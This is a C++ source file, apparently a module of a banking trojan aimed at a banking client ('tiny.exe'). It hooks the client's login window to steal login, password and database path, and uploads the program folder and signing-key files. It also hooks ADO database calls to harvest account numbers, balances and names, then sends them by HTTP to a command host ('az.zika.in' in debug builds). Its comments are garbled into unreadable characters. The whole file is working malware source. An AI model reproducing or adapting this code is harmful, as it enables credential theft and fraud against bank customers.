#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "modules.h"
#include "Plugins.h"
#include "rafa.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotCore.h"
#include "StrConsts.h"
#include "Splice.h"
#include "Unhook.h"
#include <shlwapi.h>
#include <shlobj.h>
#include "odbc.h"
#include <ole2.h>
#include <oledb.h>
#include <msdasc.h>
#include "rafa.h"
#include "BotDebug.h"

namespace TINYCLIENT
{
	#include "DbgTemplates.h"
}

#define DBG TINYCLIENT::DBGOutMessage<>

namespace Tiny
{

const int PROCESS_HASH = 0x9530DB12; // tiny.exe
const DWORD HashTfAuthNew = 0x19DEB558; //����� ���� ����� � �������

char folderTiny[MAX_PATH];

//�������� � ������� ����� ������� ����� � ����� �����������
DWORD GrabControls[] = { 0x79770896 /* TComboBox */, 0x48B934F1 /* TEdit */, 0 };
const int MaxFindedControl = 3;
static char pathMDB[MAX_PATH]; //���� � ���� ������

struct ForFindControl
{
	HWND wnds[MaxFindedControl];
	char* texts[MaxFindedControl];
	int count;
	DWORD* hashs;
};

/////////////////////////////////////////////////////////////////////////////////////////
//��������� (����� ������) ������� ��������� SQL ��������
//1 - ������ ������� ������ (������ �����), 2 - ������ ���� ��������, ������ �������
static int stateSQL = 0; 
//������� ������
static __int64 currentBalance = 0;

//���������� �� ��������
struct InfoAccount
{
	WCHAR account[16]; //���� �������
	__int64 balance; //������� �� �����, ��� Currency, ��������� 4-� ����� ���� ����� ����� (�������)
	WCHAR name[128]; //�������� �������
};

static InfoAccount accountClient;

///////////////////////////////////////////////////////////////////////////////////////////
//��� ������� ���������� ��� ������������ �������
typedef int (*type_SQLFunc)( WCHAR* sql, int len );

//������ �� �������� �������� ������� ��� ������� � ��������� sql �������
struct FilterSQLFunc
{
	WCHAR* and; //�������� ���� � ������ �������� ����������� ������ ������� ������ ������ ���������� � �������, � ����� ������ ���� 2 ����
	WCHAR* not; //�������� ���� � ������ �������� ����������� ������ ������� �� ������ ���� � �������, � ����� ������ ���� 2 ����
	type_SQLFunc func;
};

//������ ������, �������� �������� �������
static int FSF_SelectAmounts( WCHAR* sql, int len ); 

FilterSQLFunc filtersSQL[] = 
{
{ L"select\0amounts\0amountflag\0transflag\0desc\0", 0, FSF_SelectAmounts },
{ 0, 0, 0 }
};

////////////////////////////////////////////////////////////////////////////////////////////
//��� ������� ���������� ��� ������ �������� ������������� ����
typedef void (*type_FieldValueFunc)( VARIANT* v );

struct FieldValue
{
	DWORD hash; //��� ����� ����
	type_FieldValueFunc func;
};

static void FV_Code_Amounts( VARIANT* v ); //������ ���� Code ������� Amounts
static void FV_Confirmed_Amounts( VARIANT* v ); //������ ���� Confirmed ������� Amounts
static void FV_FullName_Amounts( VARIANT* v ); //������ ���� FullName ������� Amounts

FieldValue filedsValue[] =
{
{ 0xC7BF265 /* code */,			FV_Code_Amounts },
{ 0xFD84C9D2 /* confirmed */,	FV_Confirmed_Amounts },
{ 0xCD15A183 /* fullname */,	FV_FullName_Amounts },
{ 0, 0 }
};

//////////////////////////////////////////////////////////////////////////////////////////
//������ � ���� ������ ���� ����� ���������� ADO
//��������� ���������� � ����� ������
GUID IID_Connection = { 0x00000514, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };
//��������� ������ � ���������
GUID IID_Recordset  = { 0x00000535, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };
//��������� ���������� ������ � ADO
GUID IID_Command =	  { 0x00000507, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };

GUID IID_Fields = { 0x0000154d, 0x0000, 0x0010, { 0x80,0x00,0x00,0xaa,0x00,0x6d,0x2e,0xa4 } };

typedef HRESULT (__stdcall *type_QueryInterface)( void* This, REFIID riid, void **ppv );
//��� ������� ������� ���������� ������ �������� �����
typedef HRESULT (__stdcall *type_get_Fields)( void* This, void** ppv );
//������� ���� �� ������ �����
typedef HRESULT (__stdcall *type_get_Item)( void* This, VARIANT Index, void** ppv );
//������� ����� ����
typedef HRESULT (__stdcall *type_get_Name)( void* This, BSTR * pbstr );
//������� ���� ����
typedef HRESULT (__stdcall *type_get_Type)( void* This, enum DataTypeEnum * pDataType );
//������� �������� ����
typedef HRESULT (__stdcall *type_get_Value)( void* This, VARIANT * pvar );

static BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );
static HRESULT (STDAPICALLTYPE *RealCoCreateInstance)( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv );
//�������� ������ ������� � ����������� ADO
static HRESULT (__stdcall *RealConnection_Open)( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options );
static HRESULT (__stdcall *RealRecordset_Open)( void* This, VARIANT Source, VARIANT ActiveConnection, enum CursorTypeEnum CursorType, enum LockTypeEnum LockType, long Options );
static HRESULT (__stdcall *RealCommand_put_CommandText)( void* This, BSTR pbstr );
static type_get_Value RealField_get_Value;

static bool SetHooks(); //��������� ����� � ������ ����������� �������
static bool SetHooks2(); //��������� ����� � ������ ������� ����������
static bool InitData();
static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count );

static void CloseDB( ODBC* DB )
{
	if( DB ) delete DB;
}

static ODBC* OpenDB()
{
	ODBC* DB = new ODBC();
	if( DB )
	{
		char strConnect[MAX_PATH];
		m_lstrcpy( strConnect, "DRIVER=Microsoft Access Driver (*.mdb);DBQ=" );
		m_lstrcat( strConnect, pathMDB );
//		m_lstrcat( strConnect, ";UID=admin;PWD=" );
		DBG( "Tiny", "strConnect: '%s'", strConnect );
		if( !DB->Connect(strConnect) )
		{
			CloseDB(DB);
			DB = 0;
		}
	}
	return DB;
}

static char* GetAdminUrl( char* url )
{
#ifdef DEBUGCONFIG
	m_lstrcpy( url, "az.zika.in" );
#else
	string host = GetActiveHostFromBuf2(Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
	if( !host.IsEmpty() )
		m_lstrcpy( url, host.t_str() );
	else
		url = 0;
#endif
	return url;
}

//������� ������� ������� �� ����� ������
DWORD WINAPI SendTiny(LPVOID)
{
	BOT::Initialize(ProcessUnknown);
	DBG( "Tiny", "������ ������� ��������� �� ������ �� ����� %s", folderTiny );
//	DWORD folderSize = 0;
//	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
//	{
//		DBG( "Tiny", "����� ��������� ������ ��������� �������, �� ��������" );
//		return 0;
//	}
//	DBG( "Tiny", "������ ����� %d ����", folderSize );
	char tempFolder[MAX_PATH], clientPrg[MAX_PATH];
	m_memcpy( clientPrg, "tiny_client\\", 12 );
	PathToName( folderTiny, clientPrg + 12, sizeof(clientPrg) - 12 );
	pGetTempPathA( sizeof(tempFolder), tempFolder );
	char* cryptName = UIDCrypt::CryptFileName( clientPrg + 12, false );
	pPathAppendA( tempFolder, cryptName );
	STR::Free(cryptName);
	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
	{
		DBG( "Tiny", "��� ����� �� ������ ������ ������������" );
		return 0;
	}
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //��������� 2-� ����, ����� ������ ����������� "\0\0"
	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
	pCreateDirectoryA( tempFolder, 0 );
	DBG( "Tiny", "����������� �� ��������� ����� %s", tempFolder );
	*((int*)&(folderTiny[ m_lstrlen(folderTiny) ])) = 0; 
	CopyFileANdFolder( folderTiny, tempFolder );
	DBG( "Tiny", "����������� �� ������" );
	//������� �������� �����
/*
	const char* DelFolders[] = { "DATA", "OldVersion", 0 };
	int i = 0;
	while( DelFolders[i] )
	{
		pPathAppendA( tempFolder, DelFolders[i] );
		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
		DBG( "Tiny", "�������� ����� %s", tempFolder );
		DeleteFolders(tempFolder);
		pPathRemoveFileSpecA(tempFolder);
		i++;
	}
*/
	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
	DeleteFolders(tempFolder);
	DBG( "Tiny", "����������� �� ������ ��������" );
	return 0;
}

static DWORD WINAPI SendBalance( InfoAccount* ia )
{
	DBG( "Tiny", "������� �������: %ls, %I64d, '%ls'", ia->account, ia->balance, ia->name );
	char urlAdmin[128];
	if( GetAdminUrl(urlAdmin) )
	{
		fwsprintfA pwsprintfA = Get_wsprintfA();
		TMemory qr(512);
		char* account = WSTR::ToAnsi( ia->account, 0 );
		char* nameClient = WSTR::ToAnsi( ia->name, 0 );
		char* urlNameClient = URLEncode(nameClient);
		char balance[16];
		pwsprintfA( balance, "%d.%d", int(ia->balance >> 16), int((ia->balance & 0xffff)) / 100 );
		//��������� ������
		string azUser = GetAzUser();
		//pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=getdrop&sum=%s&acc=%s", urlAdmin, Bot->UID.t_str(), azUser.t_str(), balance, account );
		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), balance, account, urlNameClient);
		DBG( "Tiny", "���������� ������ %s", qr.AsStr() );
		THTTP H;
		H.Get(qr.AsStr());
		STR::Free(account);
		STR::Free(nameClient);
		STR::Free(urlNameClient);
		currentBalance = ia->balance; //���������� ������� ������
	}
	MemFree(ia);
	return 0;
}

static bool IsHash( DWORD* hashs, DWORD hash )
{
	while( *hashs )
	{
		if( *hashs == hash )
			return true;
		hashs++;
	}
	return false;
}

static void AddStrLog( const char* name, const char* value, char* resultGrab )
{
	char buf[MAX_PATH];
	m_lstrcpy( buf, name );
	m_lstrcat( buf, ": " );
	if( value )
		m_lstrcat( buf, value );
	if( resultGrab[0] ) m_lstrcat( resultGrab, ", " );
	m_lstrcat( resultGrab, buf );
	m_lstrcat( buf, "\r\n" );
	KeyLogger::AddStrToBuffer( 0, buf, 0 );
	DBG( "Tiny", buf );
}

static DWORD SendGrabData( ForFindControl* ffc )
{
	TMemory resultGrab(512);
	resultGrab.AsStr()[0] = 0;
	AddStrLog( "Login", ffc->texts[0], resultGrab.AsStr() );
	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
	m_lstrcpy( pathMDB, ffc->texts[1] );
	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
	MemFree(ffc);
	//����� � ���� ������ ���� � ������
	ODBC* db = OpenDB();
	if( db )
	{
		char pathKeys[MAX_PATH];
		pathKeys[0] = 0;
		const char* sql = "select Param from Config where Code='keypath'";
		SQLHSTMT qr = db->ExecuteSql( sql, "os255", pathKeys );
		if( qr )
		{
			db->CloseQuery(qr);
			DBG( "Tiny", "���� � ������ '%s'", pathKeys );
			KeyLogger::AddDirectory( pathKeys, "keys" );
			VideoProcess::SendFiles( 0, "keys_tiny", pathKeys, 0, true );
		}
		else
			DBG( "Tiny", "���� � ������ � ���� ������ �� ������" );
		CloseDB(db);
	}
	else
		DBG( "Tiny", "�� ������� ������� ���� %s", pathMDB );

	pSleep(10000); //���� ������� � ��������� �������

	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
	RestoreFuncs( DLL_USER32,  unhook );

	KeyLogger::CloseSession();

	return 0;
}

static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	ForFindControl* ffc = (ForFindControl*)lParam;
	DWORD hash = GetWndClassHash(hwnd);
	if( IsHash( ffc->hashs, hash ) )
	{
		ffc->wnds[ffc->count] = hwnd;
		ffc->texts[ffc->count] = GetWndText(hwnd);
		DBG( "Tiny", "find control %08x, text = %s", hwnd, ffc->texts[ffc->count] );
		ffc->count++;
		if( ffc->count >= MaxFindedControl ) return FALSE;
	}
	return TRUE;
}

/////////////////////////////////////////////////////////////////////
// ����
/////////////////////////////////////////////////////////////////////

static void* GetInterfaceFunc( void* This, int num )
{
	DWORD* pv = (DWORD*)*((DWORD*)This); //��������� ��������� �� ���������
	return (void*)pv[num];
}

static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
{
	DWORD hash = GetWndClassHash(hwnd);
	if( HashTfAuthNew == hash )
	{
		DBG( "Tiny", "�������� ���� �����������" );
		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
		ffc->count = 0;
		ffc->hashs = GrabControls;
		pEnumChildWindows( hwnd, EnumChildProc, ffc );
		if( ffc->count >= 3 )
			RunThread( SendGrabData, ffc );
	}
	return RealDestroyWindow(hwnd);
}

static char* ToHex( char* s, const BYTE* p, int c_p )
{
	fwsprintfA pwsprintfA = Get_wsprintfA();
	char* ps= s;
	for( int i = 0; i < c_p; i++ )
		ps += pwsprintfA( ps, "%02x", (int)p[i] );
	return s;
}

static HRESULT __stdcall HandlerConnection_Open( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options )
{
//	DBG( "Tiny", "Connection_Open: '%ls','%ls','%ls'", ConnectionString, UserID, Password );
	return RealConnection_Open( This, ConnectionString, UserID, Password, Options );
}

static HRESULT __stdcall HandlerField_get_Value( void* This, VARIANT * pvar )
{
	HRESULT hr = RealField_get_Value( This, pvar );
	if( SUCCEEDED(hr) )
	{
		type_get_Name get_Name = (type_get_Name)GetInterfaceFunc( This, 11 );
		BSTR nameField;
		get_Name( This, &nameField );
		DWORD hash = WSTR::GetHash( nameField, 0, true );
		int i = 0;
		while( filedsValue[i].hash )
		{
			if( filedsValue[i].hash == hash )
			{
				filedsValue[i].func(pvar);
				break;
			}
			i++;
		}
		switch( pvar->vt )
		{
			case VT_I4:
				DBG( "Tiny", "[%ls] = %d", nameField, pvar->lVal );
				break;
			case VT_BSTR:
				DBG( "Tiny", "[%ls] = '%ls'", nameField, pvar->bstrVal );
				break;
			case VT_CY:
				DBG( "Tiny", "[%ls] = %I64d", nameField, pvar->cyVal );
				break;
			default:
				DBG( "Tiny", "[%ls] type value = %d", nameField, pvar->vt );
				break;
		}
	}
	return hr;
}

static HRESULT __stdcall HandlerRecordset_Open( void* This, VARIANT Source, VARIANT ActiveConnection, enum CursorTypeEnum CursorType, enum LockTypeEnum LockType, long Options )
{
//	DBG( "Tiny", "Recordset_Open: %d,%d", (int)Source.vt, (int)ActiveConnection.vt );
	HRESULT hr = RealRecordset_Open( This, Source, ActiveConnection, CursorType, LockType, Options );
	if( SUCCEEDED(hr) )
	{
		type_get_Fields get_Fields = (type_get_Fields)GetInterfaceFunc( This, 21 );
		void* fields = 0;
		if( SUCCEEDED( get_Fields( This, &fields ) ) )
		{
			type_get_Item get_Item = (type_get_Item)GetInterfaceFunc( fields, 10 );
			void* item;
			VARIANT index;
			index.vt = VT_I4; index.lVal = 0;
			if( SUCCEEDED( get_Item( fields, index, &item ) ) )
			{
				int nums[] = {13};
				void* handlerFuncs[] = {&HandlerField_get_Value};
				void* realFuncs[] = {&RealField_get_Value};
				if( ReplacementFuncs( &item, nums, handlerFuncs, realFuncs, 1 ) )
				{
//					DBG( "Tiny", "��������� Field_get_Value" );
				}
			}
		}
	}
	return hr;
}

static HRESULT __stdcall HandlerCommand_put_CommandText( void* This, BSTR pbstr )
{
	DBG( "Tiny", "Command_put_CommandText: '%ls'", pbstr );
	//�������� ����� � �������� ������
	int len = m_wcslen(pbstr);
	int size = (2 * len + 1) * sizeof(WCHAR); //�������� � ��� ���� ������ ������, ����� ������� ������� ����� �������� ������
	WCHAR* newSQL = (WCHAR*)MemAlloc(size);
	if( newSQL )
	{
		m_wcsncpy( newSQL, pbstr, len );
		newSQL[len] = 0;
		m_wcslwr(newSQL); //������ � ������ �������
		int i = 0;
		while( filtersSQL[i].func )
		{
			bool ok = true;
			if( filtersSQL[i].and ) //����� ������� ������ ���� � �������
			{
				int j = 0;
				const WCHAR* p = newSQL;
				while( filtersSQL[i].and[j] )
				{
					int l = m_wcslen( &filtersSQL[i].and[j] ); //����� ���������� �����
					p = m_wcsstr( p, &filtersSQL[i].and[j] ); //���� ����� � �������
					if( p == 0 ) //������ �� ��������
					{
						ok = false;
						break;
					}
					p += l;
					j += l + 1; //��������� �� ��������� �����
				}
			}
			if( ok && filtersSQL[i].not ) //����� ������� �� ������ ���� � �������
			{
				int j = 0;
				while( filtersSQL[i].not[j] )
				{
					int l = m_wcslen( &filtersSQL[i].not[j] );
					const WCHAR* p = m_wcsstr( newSQL, &filtersSQL[i].not[j] );
					if( p ) //����� ����� ����, ������ �� ��������
					{
						ok = false;
						break;
					}
					j += l + 1;
				}
			}
			if( ok ) //������ ��������, ������� ��� �������
			{
				int res = filtersSQL[i].func( newSQL, len );
				if( res == 1 ) //�������� ������ ��� ����
				{
					break;
				}
				else
					if( res == 2 ) //��������� ������
					{
						pbstr = newSQL;
						break;
					}
				//res == 0 - ���������� �����
			}
			i++;
		}
	}
	HRESULT hr = RealCommand_put_CommandText( This, pbstr );
	if( newSQL ) MemFree(newSQL);
	return hr;
}

static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count )
{
	DWORD* pv = (DWORD*)*(*(DWORD**)ppv); //��������� ��������� �� ���������
	DWORD* phf = (DWORD*)handlerFuncs;
	DWORD** prf = (DWORD**)realFuncs;
	if( pv[ nums[0] ] == phf[0] )
		return true; //������� ��� ����
	//��������� ������ ������ � ������� ����� ����� ������ �� ������
	int max = 0;
	for( int i = 0; i < count; i++ ) 
		if( max < nums[i] ) max = nums[i];
	int sizeMem = sizeof(DWORD) * (max + 1); //������ ������ � ������� ����� ����� ������ �� ������

	DWORD oldProtect = 0;
	if( (BOOL)pVirtualProtect( pv, sizeMem, PAGE_EXECUTE_READWRITE, &oldProtect ) )
	{
		for( int i = 0; i < count; i++ )
			*prf[i] = pv[ nums[i] ], pv[ nums[i] ] = phf[i];
		pVirtualProtect( pv, sizeMem, oldProtect, &oldProtect);
		return true;
	}
	return false;
}

static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv )
{
//	char buf1[96], buf2[96];
//	ToHex( buf1, (BYTE*)&rclsid, sizeof(CLSID) );
//	ToHex( buf2, (BYTE*)&riid, sizeof(IID) );
//	DBG( "Tiny", "rclsid=%s, riid=%s", buf1, buf2 );
	HRESULT hr = RealCoCreateInstance( rclsid, pUnkOuter, dwClsContext, riid, ppv );
	//������������� ��������� ���� ������
	if( SUCCEEDED(hr) )
	{
		if( m_memcmp( &rclsid, &IID_Connection, sizeof(IID) ) == 0 ) 
		{
			int nums[] = {20};
			void* handlerFuncs[] = {&HandlerConnection_Open};
			void* realFuncs[] = {&RealConnection_Open};
			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
			{
//				DBG( "Tiny", "��������� Connection_Open" );
			}
		}
		else if ( m_memcmp( &rclsid, &IID_Recordset, sizeof(IID) ) == 0 ) 
		{
			int nums[] = {40};
			void* handlerFuncs[] = {&HandlerRecordset_Open};
			void* realFuncs[] = {&RealRecordset_Open};
			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
			{
//				DBG( "Tiny", "��������� Recordeset_Open" );
			}
		}
		else if ( m_memcmp( &rclsid, &IID_Command, sizeof(IID) ) == 0 ) 
		{
			int nums[] = {12};
			void* handlerFuncs[] = {&HandlerCommand_put_CommandText};
			void* realFuncs[] = {&RealCommand_put_CommandText};
			if( ReplacementFuncs( ppv, nums, handlerFuncs, realFuncs, 1 ) )
			{
//				DBG( "Tiny", "��������� Command_put_CommandText" );
			}
		}
	}
	return hr;
}


///////////////////////////////////////////////////////////////////////////////

//��������� ��� ������������
void Activeted(LPVOID Sender)
{
	DBG( "Tiny", "Activated" );
	PKeyLogSystem System = (PKeyLogSystem)Sender;
	MegaJump(SendTiny);
	VideoProcess::RecordPID( 0, "Tiny" );
	SetHooks();
}

bool Init( const char* appName )
{
	PKeyLogSystem S = KeyLogger::AddSystem( "tiny", PROCESS_HASH );
	if( S != NULL )
	{
		DBG( "Tiny", "����������� �������" );
		SetHooks2();
		m_lstrcpy( folderTiny, appName );
		pPathRemoveFileSpecA(folderTiny); //����� � ������
		S->MakeScreenShot = true;
		S->SendLogAsCAB = true;
		char* classWnd = "TfAuthNew";
		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, classWnd, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
		if( F1 )
		{
			F1->OnActivate = Activeted;
		}
		return true;
	}
	return false;
}

static bool SetHooks()
{
	if( HookApi( DLL_USER32, 0xEB4A6DB3, &HandlerDestroyWindow, &RealDestroyWindow ) )
	{
		DBG( "Tiny", "���������� ��� �� DestroyWindow" );
	}
	return true;
}

static bool SetHooks2()
{
	if( HookApi( DLL_OLE32, 0x368435BE, &HandlerCoCreateInstance, &RealCoCreateInstance ) )
	{
		DBG( "Tiny", "���������� ��� �� CoCreateInstance" );
	}
	return true;
}

static bool InitData()
{
	pathMDB[0] = 0;
//	if( GetAdminUrl(domain) == 0 )
//		domain[0] = 0;
	return true;
}

///////////////////////////////////////////////////////////////////////////////////////////
//��������� ��������

static int FSF_SelectAmounts( WCHAR* sql, int len )
{
	stateSQL = 1; //������ �������
	accountClient.account[0] = 0;
	accountClient.balance = 0;
	accountClient.name[0] = 0;
	DBG( "Tiny", "FSF_SelectAmounts(): stateSQL = 1, %ls", sql );
	return 1; //�������� ������ ��� ����
}

//////////////////////////////////////////////////////////////////////////////////////////
//������ �����

static void FV_Code_Amounts( VARIANT* v )
{
	if( stateSQL == 1 || stateSQL == 2 )
	{
		//���� � ������� ����������� ��� "xxxx xxxxxxxy.zzz", ��� zzz ��� ������ (�� ����� 980)
		//������ ������� (5-� �������) ����� ��������� ������ y, ������ ��� ������� ����������
		//���� �����
		int i = 0;
		int space = 0;
		while( v->bstrVal[i] && i < ARRAYSIZE(accountClient.account) - 1 )
		{
			if( v->bstrVal[i] == L'.' )
			{
				if( !m_wcsncmp( &v->bstrVal[i + 1], L"980", 3 ) )
				{
					stateSQL = 2;
					m_wcsncpy( accountClient.account, v->bstrVal, i );
					if( space > 0 )
					{
						accountClient.account[space] = accountClient.account[i - 1];
						accountClient.account[i - 1] = 0;
					}
					else
						accountClient.account[i] = 0;
					stateSQL = 2; //������ ���� ������, ����� ��������� ������
					DBG( "Tiny", "stateSQL = 2, account = %ls", accountClient.account );
				}
				break;
			}
			else
				if( v->bstrVal[i] == L' ' && space == 0 )
					space = i;
			i++;
		}
	}
}

static void FV_Confirmed_Amounts( VARIANT* v )
{
	if( stateSQL == 2 )
	{
		accountClient.balance = v->cyVal.int64;
		DBG( "Tiny", "balance = %I64d", accountClient.balance );
	}
}

static void FV_FullName_Amounts( VARIANT* v )
{
	if( stateSQL == 2 )
	{
		m_wcscpy( accountClient.name, ARRAYSIZE(accountClient.name), v->bstrVal );
		DBG( "Tiny", "name account: '%ls'", accountClient.name );
		if( currentBalance != accountClient.balance )
		{
			InfoAccount* ia = (InfoAccount*)MemAlloc(sizeof(InfoAccount));
			m_memcpy( ia, &accountClient, sizeof(InfoAccount) );
			RunThread( SendBalance, ia );
		}
		stateSQL = 1;
	}
}

}
